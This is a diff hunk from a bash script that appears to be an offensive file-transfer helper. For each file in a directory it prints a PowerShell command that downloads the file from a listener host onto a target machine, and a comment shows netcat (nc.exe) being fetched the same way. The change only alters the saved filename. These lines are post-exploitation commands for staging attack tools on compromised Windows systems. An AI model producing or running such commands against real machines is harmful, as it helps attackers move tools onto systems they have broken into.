@@ -69,7 +69,7 @@ then
 	echo ""
 	echo -e "${BLUE}Powershell Download Method #1:${RESET}"
 	echo ""
-	for i in $(ls); do echo "powershell -c (New-Object Net.WebClient).DownloadFile('http://$turtlepower_lhost:$1/$i', '$i.exe')"; done; 
+	for i in $(ls); do echo "powershell -c (New-Object Net.WebClient).DownloadFile('http://$turtlepower_lhost:$1/$i', '$i')"; done; 
 elif [ "$FILE_TRANSFER_METHOD" == "5" ]
 # powershell.exe Invoke-WebRequest -Uri 'http://127.0.0.1/nc.exe' -OutFile 'nc.exe'
 then
